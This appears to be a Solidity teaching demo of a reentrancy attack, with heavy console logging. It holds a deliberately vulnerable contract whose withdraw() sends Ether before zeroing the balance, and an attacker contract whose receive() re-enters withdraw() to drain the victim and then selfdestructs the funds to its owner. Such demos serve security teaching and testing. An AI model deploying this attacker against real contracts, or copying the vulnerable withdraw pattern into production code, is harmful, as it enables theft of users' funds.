//SPDX-License-Identifier: MIT
pragma solidity 0.8.19;

import {console} from "hardhat/console.sol";

contract ReentrantWithConsole {
    // Store user balances
    mapping(address user => uint256 balance) private s_balances;

    // Add ETH to the smart-contract
    function deposit() external payable {
        console.log("----Deposit----");
        console.log("  ");
        console.log("Sender: ", msg.sender);
        console.log("Value: ", msg.value);
        console.log("----Deposit END----");
        console.log("  ");

        s_balances[msg.sender] += msg.value;
    }

    // Reentrant!
    function withdraw() external {
        console.log("----Withdraw----");

        console.log("Withdraw called: ", msg.sender);
        console.log("  ");

        uint256 balance = s_balances[msg.sender];
        require(balance > 0, "Insufficient balance");

        console.log("Now Reentrant will send: ", balance);
        console.log("  ");
        (bool success, ) = payable(msg.sender).call{value: balance}("");
        require(success, "Failed to send Ether");

        console.log("  ");
        console.log("Withdraw end!!! Set balance to 0");
        console.log("  ");

        s_balances[msg.sender] = 0;

        console.log("----Withdraw END----");
        console.log("  ");
    }

    function getBalance() external view returns (uint256) {
        return address(this).balance;
    }
}

contract AttackerWithConsole {
    error Attacker__notAnOwner();
    error Attacker__notProfitableAttack();
    error Attacker__notAVictim();

    address payable private immutable i_owner;
    ReentrantWithConsole private immutable i_victim;
    uint256 depositedValue;

    constructor(ReentrantWithConsole victim) {
        i_owner = payable(msg.sender);
        i_victim = victim;
    }

    function attack() external payable {
        console.log("----Attack----");
        console.log("  ");
        if (msg.sender != i_owner) revert Attacker__notAnOwner();
        if (address(i_victim).balance < msg.value)
            revert Attacker__notProfitableAttack();

        depositedValue = msg.value;
        i_victim.deposit{value: msg.value}();

        i_victim.withdraw();
        console.log("----Attack END----");
        console.log("  ");
    }

    receive() external payable {
        console.log("----Receive----");
        console.log("Received: ", msg.value);

        if (msg.sender != address(i_victim)) revert Attacker__notAVictim();

        if (address(i_victim).balance >= depositedValue) {
            console.log("Victim balance enought, call withdraw one more time");
            console.log("  ");
            i_victim.withdraw();
        } else {
            console.log("Victim balance to small, selfdestruct");
            selfdestruct(i_owner);
        }

        console.log("----Receive END----");
        console.log("  ");
    }
}
